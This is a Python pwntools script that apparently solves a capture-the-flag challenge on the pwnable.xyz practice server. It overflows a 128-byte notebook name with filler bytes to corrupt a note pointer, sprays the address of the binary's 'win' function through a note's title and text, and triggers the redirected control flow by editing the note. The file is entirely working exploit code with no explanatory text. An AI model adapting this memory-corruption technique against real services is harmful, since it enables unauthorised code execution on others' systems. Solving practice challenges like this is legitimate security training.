from pwn import *

context(kernel="amd64", arch="amd64", log_level="info")
"""
Name your notebook: hhhhhhh
Menu:
  1. Make note
  2. Edit note
  3. Delete note
  4. Rename notebook
> 
"""

def make_note(p, size, title, text):
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b"size:", str(size).encode("utf-8"))
	p.sendafter(b"Title:", title)
	p.sendlineafter(b"Note:", text)


def edit_note(p, new_text):
	p.sendlineafter(b"> ", b"2")
	p.sendafter(b"note: ", new_text)

def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"

	if 0:
		p = process("./challenge")
		# gdb.attach(p, "b edit_note\nc")
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30035)

	win_addr = e.symbols["win"]

	# Input notebook name
	p.sendafter(b"Name your notebook: ", b"T"*128)

	make_note(p, 0x198, (p64(win_addr)*4)[:-1], p64(win_addr)*50)
	# edit_note(p, b"D"*10)

	# Rename notebook
	p.sendlineafter(b"> ", b"4",)
	p.sendafter(b"Notebook name: ",  b"\xf0"*128)

	edit_note(p, b"D"*10)

	p.interactive()

main()